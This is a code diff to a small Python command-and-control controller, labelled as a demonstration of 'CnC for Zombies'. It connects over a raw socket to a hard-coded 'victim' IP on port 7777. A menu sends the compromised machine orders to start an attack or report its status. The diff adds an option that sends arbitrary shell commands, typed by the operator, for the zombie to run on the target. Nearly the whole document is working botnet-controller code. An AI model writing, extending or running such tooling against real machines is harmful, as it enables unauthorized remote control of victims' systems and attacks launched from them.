@@ -1,6 +1,7 @@
 import socket
+import os
 
-HOST = "192.168.1.5"  # The victim's hostname or IP address
+HOST = "192.168.1.4"  # The victim's hostname or IP address
 PORT = 7777        # The port used by the server
 
 def command(command):
@@ -8,31 +9,51 @@ def command(command):
         try:
             s.connect((HOST, PORT))
         except:
-            print("\nZombie is disconnected...")
+            print("[!] Zombie is disconnected...")
         s.sendall(command.encode('utf-8'))
         data = s.recv(1024)
-        print('\nReceived: ', repr(data))
-        print('\n')
+        print('\n[+] Received: ', data.decode('utf-8'))
+        input()
+        # print("Closing socket")
+        s.close()
+        return
 
-com = 'x' # Apologies for using this kind of logic lol
+com = '0' # Apologies for using this kind of logic lol
+ch = 'y'
+banner = '''
+                    *********************************
+                    *    Controller by arc4ne       *
+                    *  Demonstrating CnC for Zombies*
+                    *********************************
+        '''
 
-while com != 'e':
+while com != '4':
+	os.system("clear")
+	print(banner)
 	print('\n')
-	print("#"*12+" Welcome to Controller "+"#"*12)
+	print("#"*13+" Welcome to Controller "+"#"*13)
 	print("\n")
-	print("[A] To Attack the Target")
-	print("[S] To Stop the Attack on Target")
-	print("[C] To Check the Zombie is up ")
-	print("[e] To Exit")
+	print("[1] To Attack the Target")
+	print("[2] To execute a command on Target machine")
+	print("[3] To Check if the Zombie is up")
+	print("[4] To Exit")
 	print("\n")
-	com = input("Choose your Action: ")
-	if com == 'a' or com == 'A':
+	com = input("[+] Choose your Action: ")
+	if com == '1':
 		command("Commence the Attack")
 
-	elif com == 'c' or com == 'C':
+	elif com == '2':
+		while ch!='n':
+			code = input("[+] Enter command to execute on zombie machine: ")
+			command("Command #"+code+"$")
+			ch = input("[+] Execute more commands? (y/n) ")
+		ch ='y'
+
+	elif com == '3':
 		command("Check the Status")
 
-	elif com == 's' or com == 'S':
-		command("Stop the Attack")
+	elif com == '4':
+		print("[!] Exiting the controller....")
 
-print("Exiting the controller....")
+	else:
+		print("[!] Enter correct choice!")
